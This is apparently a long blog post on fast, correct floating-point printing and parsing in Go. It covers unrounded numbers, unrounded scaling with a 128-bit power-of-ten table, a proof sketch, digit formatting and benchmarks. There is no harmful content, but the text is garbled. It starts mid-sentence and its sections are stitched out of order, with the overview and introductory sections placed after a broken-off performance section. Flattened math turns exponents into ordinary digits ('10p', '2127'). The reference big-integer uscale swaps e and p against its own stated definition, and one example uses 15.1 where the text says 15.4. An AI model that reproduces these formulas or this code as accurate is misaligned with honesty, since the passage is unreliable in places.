Dragonbox.\nFor more about the general optimization,\nsee Warren’sHacker’s Delight[34],\nsections 10-16 and 10-17.Fast, Accurate ScalingThe conversion algorithms we examined are nice and simple.\nFor them to be fast,uscaleneeds to be fast while remaining correct.\nAlthough multiplication by2ecan be implemented by shifts,uscalecannot actually compute or multiply by10p—that would take too long whenpis a large positive or negative number.\nInstead, we can approximate10pas a floating-point numberpm·2pewith a 128-bit mantissa,\nlooked up in a table indexed byp.\nSpecifically, we will usepe=⌊log210p⌋−127andpm=⌈10p/2pe⌉,\nensuring thatpm∈[2127,2128).\nWe will write a separate program to generate this table.\nIt emits Go code definingpow10Min,pow10Max, andpow10Tab:pow10Tab[0]holds the entry forp=pow10Min.\nTo figure out how big the table needs to be,\nwe can analyze the three functions we just wrote.FixedWidthconverts floating-point to decimal.\nIt needs to calluscalewith a 53-bitx,e∈[−1137,960], andp∈[−307,341].Shortalso converts floating-point to decimal.\nIt needs to calluscalewith a 55-bitx,e∈[−1137,960], andp∈[−292,324].Parseconverts decimal to floating-point.\nIt needs to calluscalewith a 64-bitxandp∈[−343,289].\n(Outside that range ofp,Parsecan return 0 or infinity.)So the table needs to provide answers forp∈[−343,341].If10p≈pm·2pe, thenx·2e·10p≈x·pm·2e+pe.\nIn all of our algorithms, the result ofuscalewas always small—at most 64 bits.\nSincepmis 128 bits andx·pmis even bigger,e+pemust be negative,\nso this computation is(x*pm) >> -(e+pe).\nBecause of the ceiling,pmmay be too large by an errorε0<1,\nsox·pmmay be too large by an errorε1=x·ε0<x.\nTo round exactly, we care whether any of the shifted bits is 1,\nbutε1may change the lowbits(x)bits,\nso we can’t trust them.\nInstead, we will throw them away.\nand use only the upper bits to compute our unrounded number.\nThat is the entire idea!Now let’s look at the implementation.\nTheprescalefunction returns ascalerwithpmand a shift counts:// A scaler holds derived scaling constants for a given e, p pair.type scaler struct {\n\tpm pmHiLo\n\ts  int\n}// A pmHiLo represents hi<<64 + lo.type pmHiLo struct {\n\thi uint64\n\tlo uint64\n}fpfmt/unopt/fpfmt.go:256,266We want the shift count to reserve two extra bits for the unrounded\nrepresentation and to apply to the top 64-bit word of the 192-bit product,\nwhich gives this formula:s=−(e+pe)−2−(192−64)=−(e+⌊log210p⌋−127)−2−128=−(e+⌊log210p⌋+3)That translates directly to Go:// prescale returns the scaling constants for e, p.// lp must be log2Pow10(p).func prescale(e, p, lp int) scaler {\n\treturn scaler{pm: pow10Tab[p-pow10Min], s: -(e + lp + 3)}\n}fpfmt/fpfmt.go:292,296Inuscale, since the caller left-justifiedxto 64 bits,\ndiscarding the lowbits(x)bits means discarding the\nlowest 64 bits of the product, which we skip computing entirely.\nThen we use the middle 64-bit word and the lowsbits\nof the upper word to set the sticky bit in the result.// uscale returns unround(x * 2**e * 10**p).// The caller should pass c = prescale(e, p, log2Pow10(p))// and should have left-justified x so its high bit is set.func uscale(x uint64, c scaler) unrounded {\n\thi, mid := bits.Mul64(x, c.pm.hi)\n\tmid2, _ := bits.Mul64(x, c.pm.lo)\n\tmid, carry := bits.Add64(mid, mid2, 0)\n\thi += carry\n\tsticky := bool2[unrounded](mid != 0 || hi&((1<<c.s)-1) != 0)\n\treturn unrounded(hi>>c.s) | sticky\n}fpfmt/unopt/fpfmt.go:302,312It is mind-boggling that this works, but it does.\nOf course, you shouldn’t take my word for it.\nWe have to prove it correct.Sketch of a Proof of Fast ScalingTo prove that our fastuscalealgorithm is correct,\nthere are three cases: small positivep,\nsmall negativep,\nand largep.\nThe actual proof, especially for largep,\nis non-trivial,\nand the details are quite a detour from\nour fast scaling implementations,\nso this section only sketches the basic ideas.\nFor the details, see the accompanying post, “Fast Unrounded Scaling: Proof by Ivy.”Remember from the previous section thatpm=⌈10p/2pe⌉=10p/2pe+ε0for someε0<1.\nSince10p=5p·2p,pm’s 128 bits need only represent the5ppart; the2pcan always be handled bype.Forp∈[0,27),5pfits in the top 64 bits of the 128-bitpm.\nSincepmis exact,\nthe only possible error is introduced by discarding the bottombits(x)bits.\nSince the bottom 64 bits ofpmare zero,\nthe bits we discard are all zero.\nSouscaleis correct for small positivep.Forp∈[−27,−1],x·pmis approximating division by5−p(remember that−pis a positive number!).\nThe 128-bit approximation is precise enough that whenxis a\nmultiple of5−p, only the lowestbits(x)bits are non-zero;\ndiscarding them keeps the unrounded form exact.\nAnd whenxis not a multiple of5−p,\nthe result has a fractional part that must be at least1/5−paway from an integer.\nThat fractional separation is much larger than the maximum error in the product,\nso the high bits saved in the unrounded form are correct;\nthe fraction is also repeating, so that there is guaranteed\nto be a 1 bit to cause the unrounded form to be marked inexact.\nSouscaleis correct for small negativep.Finally, we must handle largep, which always have a non-zero error\nand therefore should always return unrounded numbers marked inexact\n(with the sticky bit set to 1).\nConsider the effect of adding a small error to the idealized “correct”x·10p/2pe,\nproducingx·pm.\nThe error is at most 64 bits.\nAdding that error to the 192-bit product can certainly affect\nthe low 64 bits, and it may also generate a carry out of the low 64\ninto the middle 64 bits.\nThe carry turns 1 bits into 0 bits from right to left\nuntil it hits a 0 bit;\nthat first 0 bit becomes a 1, and the carry stops.\nThe key insight is that seeing a 1 in the middle bits\nis proof that the carry did not reach the high bits,\nso the high bits are correct.\n(Seeing a 1 in the middle bits also ensures that\nthe unrounded form is marked inexact, as it must be,\neven though we discarded the low bits.)\nUsing a program backed by careful math, we can analyze all thepmin our table,\nshowing that every possiblex·pmhas a 1 in the middle bits.\nSouscaleis correct for largep.Omit Needless MultiplicationsWe have a fast and correctuscale, but we can make it faster\nnow that we understand the importance of carry bits.\nThe idea is to compute the high 64 bits of the product\nand then use it directly whenever possible, avoiding the computation\nof the remaining 64 bits at all.\nTo make this work, we need the high 64 bits to be rounded up,\na ceiling instead of a floor.\nSo we will change thepmHiLofrom representinghi·264+lotohi·264−lo.// A pmHiLo represents hi<<64 - lo.type pmHiLo struct {\n\thi uint64\n\tlo uint64\n}fpfmt/fpfmt.go:280,284The exact computation using this form would be:hi, mid := bits.Mul64(x, c.pm.hi)\nmid2, lo := bits.Mul64(x, c.pm.lo)\nmid, carry := bits.Sub64(mid, mid2, bool2[uint64](lo > 0))\nhi -= carry\nreturn unrounded(hi >> c.s) | bool2[unrounded](hi&((1<<c.s)-1) != 0 || mid != 0)The 128-bit productx·pm.hicomputed on the first line\nmay be too big by an error of up to264,\nwhich may or may not affect the high 64 bits;\nThe middle three lines correct the product,\npossibly subtracting 1 fromhi.\nLike in the proof sketch, if any of the bottomsbits of the approximatehiis a 1 bit,\nthat 1 bit would stop the subtracted carry from\naffecting the higher bits, indicating that we don’t need to correct the product.Using this insight, the optimizeduscaleis:// uscale returns unround(x * 2**e * 10**p).// The caller should pass c = prescale(e, p, log2Pow10(p))// and should have left-justified x so its high bit is set.func uscale(x uint64, c scaler) unrounded {\n\thi, mid := bits.Mul64(x, c.pm.hi)\n\tsticky := uint64(1)\n\tif hi&(1<<(c.s&63)-1) == 0 {\n\t\tmid2, _ := bits.Mul64(x, c.pm.lo)\n\t\tsticky = bool2[uint64](mid-mid2 > 1)\n\t\thi -= bool2[uint64](mid < mid2)\n\t}\n\treturn unrounded(hi>>c.s | sticky)\n}fpfmt/fpfmt.go:298,310The fix-up looks different from the exact computation above\nbut it has the same effect.\nWe don’t need the actual final value ofmid, only the carry\nand its effect on the sticky bit.On some systems, notably x86-64,bits.Mul64computes both results in a single instruction.\nOn other systems, notably ARM64,bits.Mul64must use two different instructions;\nit helps on those systems to write the code this way,\noptimizing away the computation for the low half ofx·pm.lo.The more bits that are being shifted out ofhi,\nthe more likely it is that a 1 bit is being shifted out,\nso that we have an answer after only the firstbits.Mul64.\nWhenShortcallsuscale, it passes twoxthat\ndiffer only in a single bit\nand multiplies them by the samepm.hi.\nWhile one of them might clear the lowsbits ofhi,\nthe other is unlikely to also clear them,\nso we are likely to hit the fast path at least once,\nif not twice.\nIn the case whereShortcallsuscalethree times,\nwe are likely to hit the fast path at least twice.\nThis optimization means that, most of the time, auscaleis implemented by a single wide multiply.\nThis is the main reason thatShortruns faster than\nRyū, Schubfach, and Dragonbox, as we will see in the next section.PerformanceI promised these algorithms would be simpleandfast.\nI hope you are convinced about simple.\n(If not, keep in mind that the implementations in widespread\nuse today are far more complicated!)\nNow it is time to evaluate ‘fast’\nby comparing against other implementations.\nAll the other implementations are written in C or C++ and compiled by a C/C++ compiler.\nTo isolate compilation differences,\nI translated the Go code to C and measured\nboth the Go code and the C translation.I ran the benchmarks on two systems.Apple M4 (2025 MacBook Air ‘Mac16,12’), 32 GB RAM, macOS 26.1, Apple clang 17.0.0 (clang-1700.6.3.2)AMD Ryzen 9 7950X, 128 GB RAM, Linux 6.17.9 and libc6 2.39-0ubuntu8.6, Ubuntu clang 18.1.3 (1ubuntu1)Both systems used Go 1.26rc1.\nThe full benchmark code is in thersc.io/fpfmtpackage.Printing TextReal implementations generate strings, so we need to write\ncode to convert the integers we have been returning into digit sequences,\nlike this:// formatBase10 formats the decimal representation of u into a.// The caller is responsible for ensuring that a is big enough to hold u.// If a is too big, leading zeros will be filled in as needed.func formatBase10(a []byte, u uint64) {\n\tfor nd := len(a) - 1; nd >= 0; nd-- {\n\t\ta[nd] = byte(u%10 + '0')\n\t\tu /= 10\n\t}\n}fpfmt/unopt/fpfmt.go:368,376Unfortunately, if we connect our fastFixedWidthandShortto this\nversion offormatBase10, benchmarks spend most of their time in the formatting loop.\nThere are a variety of clever ways to speed up digit formatting.\nFor our purposes, it suffices to use the old trick of\nsplitting the number into two-digit chunks and\nthen converting each chunk by\nindexing a 200-byte lookup table (more precisely, a “lookup string”) of all 2-digit values from 00 to 99:// i2a is the formatting of 00..99 concatenated,// a lookup table for formatting [0, 99].const i2a = \"00010203040506070809\" +\n\t\"10111213141516171819\" +\n\t\"20212223242526272829\" +\n\t\"30313233343536373839\" +\n\t\"40414243444546474849\" +\n\t\"50515253545556575859\" +\n\t\"60616263646566676869\" +\n\t\"70717273747576777879\" +\n\t\"80818283848586878889\" +\n\t\"90919293949596979899\"fpfmt/fpfmt.go:353,364Using this table and unrolling the loop to allow the\ncompiler to optimize away bounds checks, we end up withformatBase10:// formatBase10 formats the decimal representation of u into a.// The caller is responsible for ensuring that a is big enough to hold u.// If a is too big, leading zeros will be filled in as needed.func formatBase10(a []byte, u uint64) {\n\tnd := len(a)\n\tfor nd >= 8 {// Format last 8 digits (4 pairs).x3210 := uint32(u % 1e8)\n\t\tu /= 1e8\n\t\tx32, x10 := x3210/1e4, x3210%1e4\n\t\tx1, x0 := (x10/100)*2, (x10%100)*2\n\t\tx3, x2 := (x32/100)*2, (x32%100)*2\n\t\ta[nd-1], a[nd-2] = i2a[x0+1], i2a[x0]\n\t\ta[nd-3], a[nd-4] = i2a[x1+1], i2a[x1]\n\t\ta[nd-5], a[nd-6] = i2a[x2+1], i2a[x2]\n\t\ta[nd-7], a[nd-8] = i2a[x3+1], i2a[x3]\n\t\tnd -= 8\n\t}\n\n\tx := uint32(u)\n\tif nd >= 4 {// Format last 4 digits (2 pairs).x10 := x % 1e4\n\t\tx /= 1e4\n\t\tx1, x0 := (x10/100)*2, (x10%100)*2\n\t\ta[nd-1], a[nd-2] = i2a[x0+1], i2a[x0]\n\t\ta[nd-3], a[nd-4] = i2a[x1+1], i2a[x1]\n\t\tnd -= 4\n\t}\n\tif nd >= 2 {// Format last 2 digits.x0 := (x % 1e2) * 2\n\t\tx /= 1e2\n\t\ta[nd-1], a[nd-2] = i2a[x0+1], i2a[x0]\n\t\tnd -= 2\n\t}\n\tif nd > 0 {// Format final digit.a[0] = byte('0' + x)\n\t}\n}fpfmt/fpfmt.go:366,406This is more code than I’d prefer, but it is at least straightforward.\nI’ve seen much more complex versions.WithformatBase10, we can buildFmt, which formats in standard exponential notation:// Fmt formats d, p into s in exponential notation.// The caller must pass nd set to the number of digits in d.// It returns the number of bytes written to s.func Fmt(s []byte, d uint64, p, nd int) int {// Put digits into s, leaving room for decimal point.formatBase10(s[1:nd+1], d)\n\tp += nd - 1// Move first digit up and insert decimal point.s[0] = s[1]\n\tn := nd\n\tif n > 1 {\n\t\ts[1] = '.'\n\t\tn++\n\t}// Add 2- or 3-digit exponent.s[n] = 'e'\n\tif p < 0 {\n\t\ts[n+1] = '-'\n\t\tp = -p\n\t} else {\n\t\ts[n+1] = '+'\n\t}\n\tif p < 100 {\n\t\ts[n+2] = i2a[p*2]\n\t\ts[n+3] = i2a[p*2+1]\n\t\treturn n + 4\n\t}\n\ts[n+2] = byte('0' + p/100)\n\ts[n+3] = i2a[(p%100)*2]\n\ts[n+4] = i2a[(p%100)*2+1]\n\treturn n + 5\n}fpfmt/fpfmt.go:312,345When callingFmtwith aFixedWidthresult, we know the digit countndalready.\nFor aShortresult, we can compute the digit count easily from the bit length:// Digits returns the number of decimal digits in d.func Digits(d uint64) int {\n\tnd := log10Pow2(bits.Len64(d))\n\treturn nd + bool2[int](d >= uint64pow10[nd])\n}fpfmt/fpfmt.go:347,351Fixed-Width PerformanceTo evaluate fixed-width printing,\nwe need to decide which floating-point values to convert.\nI generated 10,000 uint64s in the range[1,263−252)and used them as\nfloat64 bit patterns.\nThe limited range avoids negative numbers, infinities, and NaNs.\nThe benchmarks all use Go’sChaCha8-based generatorwith a fixed seed for reproducibility.\nTo reduce timing overhead, the benchmark builds an array of 1000 copies of the value\nand calls a function that converts every value in the array in sequence.\nTo reduce noise, the benchmark times that function call 25 times and uses the median timing.\nWe also have to decide how many digits to ask for:\nlonger sequences are more difficult.\nAlthough I investigated a wider range, in this post I’ll show\ntwo representative widths: 6 digits (Cprintf’s default) and 17 digits\n(the minimum to guarantee accurate round trips, so widely used).The implementations I timed are:dblconv: Loitsch’sdouble-conversion library, using theToExponentialfunction.\nThis library, used in Google Chrome,\nimplements a handful of special cases for small binary exponents\nand falls back to a bignum-based printer for larger exponents.dmg1997: Gay’sdtoa.c,archived in 1997.\nFor our purposes, this represents Gay’s original C implementation\ndescribed in his technical report from 1990  [11].\nI confirmed that this 1997 snapshot runs at the same speed as\n(and has no significant code changes compared to)\nanother copy dating back to May 1991 or earlier.dmg2017: Gay’sdtoa.c,archived in 2017.\nIn 2017, Gay published an updated version ofdtoa.cthat usesuint64math and\na table of 96-bit powers of ten. It is significantly faster than the original version (see below).\nIn November 2025, I confirmed that the latest version runs at the same speed as this one.libc:\nThe C standard library conversion usingsprintf(\"%.*e\", prec-1).\nThe conversion algorithm varies by C library.\nThe macOS C library seems to wrap a pre-2017 version ofdtoa.c,\nwhile Linux’s glibc uses its own bignum-based code.\nIn general the C library implementations have not kept pace\nwith recent algorithms and are slower than any of the others.ryu: Adams’sRyū library, using thed2exp_bufferedfunction.\nIt uses the Ryū Printf algorithm [3].uscale: The unrounded scaling approach, using the Go code in this post.uscalec: A C translation of the unrounded scaling Go code.Here is a scatterplot showing the times required to formatfto 17 digits,\nrunning on the Linux system:(Click on any of the graphs in this post for a larger view.)The X axis is the log of the floating point inputf,\nand\nthe Y axis is the time required for a single conversion of the given input.\nThe scatterplot makes many things clear. For example, it is obvious that\nthere are two kinds of implementations.\nThose that use bignums take longer for large exponents and\nhave a “winged” scatterplot,\nwhile those that avoid bignums run at a mostly constant speed across\nthe entire exponent range.\nThe scatterplot also highlights many interesting data-dependent patterns in the timings,\nmost of which I have not investigated.\nA friend remarked that you could probably spend a whole career\nanalyzing the patterns in this one plot.For our purposes, it would help to have a clearer comparison\nof the speed of the different algorithms.\nThe right tool for that is a plot of the cumulative distribution function (CDF),\nwhich looks like this:Now time is on the X axis (still log scale), and the Y axis plots what\nfraction of the inputs ran in that time or less.\nFor example, we can see that dblconv’s fast path applies to most inputs,\nbut its slow path is much slower than Linux glibc or\neven Gay’s original C library.The CDF only plots the middle 99.9% of timings\n(dropping the 0.05% fastest and slowest),\nto avoid tails caused by measurement noise.\nIn general, measurements are noisier on the Mac because\nARM64 timers only provide ~20ns precision,\ncompared to the x86’s sub-nanosecond precision.Here are the scatterplots and CDFs for 6-digit output on the two systems: This post is rather long—far longer than the implementations!—so here is a brief overview of the sections\nfor easier navigation and understanding where we’re headed.“Fixed-Point and Floating-Point Numbers”\nbriefly reviews fixed-point and floating-point numbers,\nestablishing some terminology and concepts needed for the rest of the post.“Unrounded Numbers” introduces the idea of unrounded numbers,\ninspired by the IEEE754 floating-point extended format.“Unrounded Scaling” defines the unrounded scaling primitive.“Fixed-Width Printing” formats floating-point numbers\nwith a given (fixed) number of decimal digits, at most 18.“Parsing Decimals” parses decimal numbers of\nat most 19 digits into floating-point numbers.“Shortest-Width Printing” formats floating-point numbers\nusing the shortest representation that parses back to the original number.“Fast Unrounded Scaling” reveals the\nshort but subtle implementation of fast unrounded scaling\nthat enables those simple algorithms.“Sketch of a Proof of Fast Scaling” briefly sketches the proof\nthat the fast unrounded scaling algorithm is correct.\nA companion post, “Fast Unrounded Scaling: Proof by Ivy”\nprovides the full details.“Omit Needless Multiplications” uses a key idea from the proof\nto optimize the fast unrounded scaling implementation further,\nreducing it to a single 64-bit multiplication in many cases.“Performance” compares the performance of the\nimplementation of these algorithms against earlier ones.“History and Related Work” examines the history of\nsolutions to the floating-point printing and parsing problems\nand traces the origins of the specific ideas used in this\npost’s algorithms.For the last decade, there has been a new algorithm for floating-point printing and parsing\nevery few years.\nGiven the simplicity and speed of the algorithms in this post\nand the increasingly small deltas between successive algorithms,\nperhaps we are nearing an optimal solution.Fixed-Point and Floating-Point NumbersFixed-point numbers have the formf=m·Befor an integer mantissam, constant baseB, and constant (fixed) exponente.\nWe can create fixed-point representations\nin any base, but the most common are base 2 (for computers)\nand base 10 (for people).\nThis diagram shows fixed-point numbers at various scales\nthat can represent numbers between 0 and 1:Using a smaller scaling factor increases precision\nat the cost of larger mantissas.\nWhen representing very large numbers, we can use\nlarger scaling factors to reduce the mantissa size.\nFor example, here are various representations of\nnumbers around one billion:Floating-point numbers are the same as base-2 fixed-point numbers except thatechanges with\nthe overall size of the number.\nSmall numbers use very small scaling factors\nwhile large numbers use large scaling factors,\naiming to keep the mantissas a constant length.\nFor float64s, the exponenteis chosen so that the mantissamhas 53 bits,\nmeaningm∈[252,253).\nFor example, for numbers in[½,1), float64s usee=−53;\nfor numbers in[1,2)they usee=−52;\nand so on.[The notation[a,b)is ahalf-open interval, which includesabut notb.\nIn contrast, theclosed interval[a,b]includes bothaandb.\nWe writex∈[a,b)orx∈[a,b]to say thatxis in that interval.\nUsing this notation,m∈[252,253)means252≤m<253.]In addition to limiting the mantissa size, we must also limit the exponent,\nto keep the overall number a fixed size.\nFor float64s, assumingm∈[252,253), the exponente∈[−1074,971].A float64 consists of 1 sign bit, 11 exponent bits, and 52 mantissa bits.\nThenormal11-bit exponent encodings0x001through0x3fedenotee=−1074throughe=971.\nFor those, the mantissam∈[252,253),\nand it is encoded into only 52 bits by omitting the leading 1 bit.\nThe special exponent encoding0x3ffis used for infinity and not-a-number.\nThat leaves the encoding0x000, which is also special.\nIt denotese=−1074(like0x001does)\nbut with mantissasm∈[0,252)without an implicit leading 1.\nThesesubnormalsordenormalized numbers[8]\ncontinue the fixed-point2−1074scale down to zero,\nwhich ends up encoded (not coincidentally) as 64 zero bits.Other definitions of floating point numbers use different interpretations.\nFor example the IEEE754 standard usesm∈[1,2)withe∈[−1023,1023],\nwhile the C standard libaryfrexpfunction usesm∈[½,1)withe∈[−1022,1024].\nBoth of these choices makemitself a fixed-point number instead of an integer.\nOur integer definition lets us use integer math.\nThese interpretations are all equivalent and differ only by a constant added toe.This description of float64s applies to float32s as well, but with different constants. This table summarizes the two encodings:float32float64sign bits11encoded mantissa bits2352encoded exponent bits811exponent range form∈[1,2)[−127,127][−1023,1023]exponent range for integerm[−150,104][−1074,971]normal numbers[223,224)·2[−150,104][252,253)·2[−1074,971]subnormal numbers[0,223)·2−150[0,252)·2−1074exponent range for 64-bitm[−190,64][−1085,960]normal numbers[263,264)·2[−190,64][263,264)·2[−1085,960]subnormal numbers[0,263)·2−190[0,263)·2−1085To convert a float64 to its bits, we use Go’smath.Float64bits.// unpack64 returns m, e such that f = m * 2**e.// The caller is expected to have handled 0, NaN, and ±Inf already.// To unpack a float32 f, use unpack64(float64(f)).func unpack64(f float64) (uint64, int) {\n\tconst shift = 64 - 53\n\tconst minExp = -(1074 + shift)\n\tb := math.Float64bits(f)\n\tm := 1<<63 | (b&(1<<52-1))<<shift\n\te := int((b >> 52) & (1<<shift - 1))\n\tif e == 0 {\n\t\tm &^= 1 << 63\n\t\te = minExp\n\t\ts := 64 - bits.Len64(m)\n\t\treturn m << s, e - s\n\t}\n\treturn m, (e - 1) + minExp\n}fpfmt/fpfmt.go:23,39To convert back, we use Go’smath.Float64frombits.// pack64 takes m, e and returns f = m * 2**e.// It assumes the caller has provided a 53-bit mantissa m// and an exponent that is in range for the mantissa.func pack64(m uint64, e int) float64 {\n\tif m&(1<<52) == 0 {\n\t\treturn math.Float64frombits(m)\n\t}\n\treturn math.Float64frombits(m&^(1<<52) | uint64(1075+e)<<52)\n}fpfmt/fpfmt.go:41,49[Other presentations use “fraction” and “significand” instead of “mantissa”.\nThis post uses mantissa for consistency with my 2011 post\nand because I generally agree with Agatha Mallett’s excellent\n“In Defense of ‘Mantissa’”.]Unrounded NumbersFloating-point operations are defined as if computed exactly to infinite precision\nand then rounded to the nearest actual floating-point number,\nbreaking ties by rounding to an even mantissa.\nOf course, real implementations don’t use infinite precision;\nthey only keep enough precision to round properly.\nWe will use the same idea.\nIn our algorithms, we want the scaling operation to eventually evaluate to an integer,\nbut we want to give the caller control over the rounding step.\nSo instead of returning an integer, we will return anunrounded number,\nwhich contains all the information needed to round it in a variety of ways.The unrounded form of any real numberx, which we will write as as⟨x⟩,\nis the truncated integer part ofxfollowed by two more bits.\nThose bits indicate (1) whether the fractional part ofxwas at least ½, and (2) whether the fractional part was not exactly 0 or ½.\nIf you think ofxas a real number written in binary, the first extra bit is the bit immediately after the “binary point”—the bit that represents2−1, aka the ½ bit—and the second extra bit is the OR of all the bits after the ½ bit.This definition applies even to numbers that require an infinite binary representation.\nFor example, just as 1/3 requires an infinite decimal representation ‘0.333...’,\n1.6 requires an infinite binary representation ‘1.1001100110011...’.\nThe unrounded version⟨1.6⟩is finite: ‘1.11’.\nBut instead of reading unrounded numbers in binary,\nlet’s print⟨x⟩as‘n.hs’wherenis the integer part⟨x⟩>>2,his 0 or 5, andsis ‘+’ when the second bit is 1.\nThen⟨1.6⟩is written ‘1.5+’.⟨x⟩=⌊4x⌋|(4x≠⌊4x⌋)⟨6exactly⟩=24=‘6.0’⟨6.000001⟩=25=‘6.0+’⟨6.499999⟩=25=‘6.0+’⟨6.5exactly⟩=26=‘6.5’⟨6.500001⟩=27=‘6.5+’⟨6.999999⟩=27=‘6.5+’⟨7exactly⟩=28=‘7.0’Let’s implement unrounded numbers in Go.type unrounded uint64\n\nfunc unround(x float64) unrounded {\n\treturn unrounded(math.Floor(4*x)) | bool2[unrounded](math.Floor(4*x) != 4*x)\n}\n\nfunc (u unrounded) String() string {\n\treturn fmt.Sprintf(\"⟨%d.%d%s⟩\", u>>2, 5*((u>>1)&1), \"+\"[1-u&1:])\n}fpfmt/fpfmt.go:52,61Thebool2function converts a boolean to an integer.\n(The Go compiler will implement this using an inlined conditional move.)// bool2 converts b to an integer: 1 for true, 0 for false.func bool2[T ~int | ~uint64](b bool) T {\n\tif b {\n\t\treturn 1\n\t}\n\treturn 0\n}fpfmt/fpfmt.go:15,21We won’t use theunroundconstructor in our actual code, but it’s helpful for playing.\nFor example, we can try the examples we just saw:row(\"x\", \"raw\", \"str\")\nfor _, x := range []float64{6, 6.001, 6.499, 6.5, 6.501, 6.999, 7} {\n    u := unround(x)\n    row(x, uint64(u), u)\n}\ntable()x      raw  str\n6      24   ⟨6.0⟩\n6.001  25   ⟨6.0+⟩\n6.499  25   ⟨6.0+⟩\n6.5    26   ⟨6.5⟩\n6.501  27   ⟨6.5+⟩\n6.999  27   ⟨6.5+⟩\n7      28   ⟨7.0⟩The unrounded form⟨x⟩holds the information needed by all the usual rounding operations.\nAdding 0, 1, 2, or 3 and then dividing by four (or shifting right by two) yields: floor, round with ½ rounding down, round with ½ rounding up, and ceiling.\nIn floating-point math, we want to round with ½ rounding to even, meaning 1½ and 2½ both round to 2.\nWe can do that by adding1+odd(x),\nwhereodd(x)is 0 or 1 according to whetherxis odd.\nThat’s just the low bit ofx:odd(x)=(x&1)=(⟨x⟩>>2)&1.Putting that all together:⌊⟨x⟩⌋=(⟨x⟩+0)>>2(floor)[⟨x⟩]−=(⟨x⟩+1)>>2(round,halfdown)[⟨x⟩]even=(⟨x⟩+1+odd(x))>>2(round,halftoeven)=(⟨x⟩+1+((⟨x⟩>>2)&1))>>2[⟨x⟩]+=(⟨x⟩+2)>>2(round,halfup)⌈⟨x⟩⌉=(⟨x⟩+3)>>2(ceiling)In Go:func (u unrounded) floor() uint64         { return uint64((u + 0) >> 2) }\nfunc (u unrounded) roundHalfDown() uint64 { return uint64((u + 1) >> 2) }\nfunc (u unrounded) round() uint64         { return uint64((u + 1 + (u>>2)&1) >> 2) }\nfunc (u unrounded) roundHalfUp() uint64   { return uint64((u + 2) >> 2) }\nfunc (u unrounded) ceil() uint64          { return uint64((u + 3) >> 2) }fpfmt/fpfmt.go:62,66row(\"x\", \"floor\", \"round½↓\", \"round\", \"round½↑\", \"ceil\")\nfor _, x := range []float64{6, 6.25, 6.5, 6.75, 7, 7.5, 8.5} {\n    u := unround(x)\n    row(u, u.floor(), u.roundHalfDown(), u.round(), u.roundHalfUp(), u.ceil())\n}\ntable()x       floor  round½↓  round  round½↑  ceil\n⟨6.0⟩   6      6        6      6        6\n⟨6.0+⟩  6      6        6      6        7\n⟨6.5⟩   6      6        6      7        7\n⟨6.5+⟩  6      7        7      7        7\n⟨7.0⟩   7      7        7      7        7\n⟨7.5⟩   7      7        8      8        8\n⟨8.5⟩   8      8        8      9        9Dividing unrounded numbers preserves correct rounding as long as the second extra bit\nis maintained correctly: once it is set to 1, it has to stay a 1 in all future results.\nThis gives the second extra bit its shorter name: thesticky bit.To divide an unrounded number, we do a normal divide but force the sticky bit to 1\nwhen there is a remainder.\nRight shift does the same.⟨x/n⟩=(⟨x⟩/n)|(⟨x⟩modn≠0)|(⟨x⟩&1)⟨x>>n⟩=(⟨x⟩>>n)|(⟨x⟩mod2n≠0)|(⟨x⟩&1)For example, if we rounded 15.4 to an integer 15 and then divided it by 6,\nwe’d get 2.5, which rounds down to 2,\nbut the more precise answer would be 15.4/6 = 2.57, which rounds up to 3.\nAn unrounded division handles this correctly:⟨15.4⟩=61‘15.0+’“alittlemorethan15”⟨15.4/6⟩=11‘2.5+’“alittlemorethan2½”[⟨15.4/6⟩]=3Let’s implement division and right shift in Go:func (u unrounded) div(d uint64) unrounded {\n\tx := uint64(u)\n\treturn unrounded(x/d) | u&1 | bool2[unrounded](x%d != 0)\n}\n\nfunc (u unrounded) rsh(s int) unrounded {\n\treturn u>>s | u&1 | bool2[unrounded](u&((1<<s)-1) != 0)\n}fpfmt/fpfmt.go:69,76u := unround(15.1).div(6)\nfmt.Println(u, u.round())⟨2.5+⟩ 3Finally, we are going to need to be able to nudge an unrounded number\nup or down before computing a ceiling or floor,\nas if we added or subtracting a tiny amount.\nLet’s add that:func (u unrounded) nudge(δ int) unrounded { return u + unrounded(δ) }fpfmt/fpfmt.go:67row(\"x\", \"nudge(-1).floor\", \"floor\", \"ceil\", \"nudge(+1).ceil\")\nfor _, x := range []float64{15, 15.1, 15.9, 16} {\n    u := unround(x)\n    row(u, u.nudge(-1).floor(), u.floor(), u.ceil(), u.nudge(+1).ceil())\n}x        nudge(-1).floor  floor  ceil  nudge(+1).ceil\n⟨15.0⟩   14               15     15    16\n⟨15.0+⟩  15               15     16    16\n⟨15.5+⟩  15               15     16    16\n⟨16.0⟩   15               16     16    17Floating-point hardware maintains three extra bits to round\nall arithmetic operations correctly.\nFor just division and right shift, we can get by with only two bits.Unrounded ScalingThe fundamental insight of this post is that all\nfloating-point conversions can be written correctly\nand simply usingunrounded scaling,\nwhich multiplies a numberxby a power of two and a power of ten\nand returns the unrounded product.uscale(x,e,p)=⟨x·2e·10p⟩.Whenpis negative, the value10pcannot be stored exactly in any finite binary floating-point number,\nso any implementation of uscale must be careful.In Go, we can implement uscale using big integers and an unrounded division:func uscale(x uint64, e, p int) unrounded {\n    num :=   mul(big(4), big(x), pow(2, max(0, p)),  pow(10, max(0, e)))\n    denom := mul(                pow(2, max(0, -p)), pow(10, max(0, -e)))\n    div, mod := divmod(num, denom)\n    return unrounded(div.uint64() | bool2[uint64](!mod.isZero()))\n}Themaxexpressions choose between multiplying2eintonumwhene>0or multiplying2−eintodenomwhene<0,\nand similarly for10p.\nThedivmodimplements the floor, andmod.isZeroreports\nwhether the floor was exact.This implementation of uscale is correct but inefficient.\nIn our usage,eandpwill mostly cancel out,\ntypically with opposite signs,\nand the inputxand resultuscale(x,e,p),\nwill always fit in 64 bits.\nThat limited input domain and range makes it possible\nto implement a very fast, completely accurate uscale,\nand we’ll see that implementation later.Our actual implementation will be split into two functions,\nto allow sharing some computations derived frompande.\nInstead ofuscale(x, e, p), the fast Go version will be called asuscale(x, prescale(e, p, log2Pow10(p))).\nAlso, callers are responsible for passing in anxleft-shifted to have its\nhigh bit set.\nTheunpackfunction we looked at already arranged that for its result,\nbut otherwise callers need to do something like:shift = 64 - bits.Len64(x)\n... uscale(x<<shift, prescale(e-shift, p, log2Pow10(p))) ...Conceptually, uscale maps numbers on one fixed-point scale to numbers on another,\nincluding converting between binary and decimal scales.\nFor example, consider the scales2−13and10−4:Givenxfrom the2−13side,uscale(x,−13,4)maps to the equivalent\npoint on the10−4side;\nand givenxfrom the10−4,uscale(x,13,−4)maps to the equivalent\npoint on 